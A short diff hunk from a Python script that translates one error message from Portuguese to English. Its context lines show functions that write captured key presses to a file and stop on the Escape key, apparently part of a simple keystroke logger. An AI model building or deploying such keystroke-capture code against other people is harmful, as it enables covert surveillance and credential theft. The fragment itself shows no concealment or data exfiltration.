@@ -29,7 +29,7 @@ def write_file(keys):
                 elif 'Key' not in k: 
                     f.write(k)
             except Exception as e:
-                print(f"Erro ao processar tecla: {e}")
+                print(f"Error processing key: {e}")
 
 def released_key(key):
     if key == Key.esc:
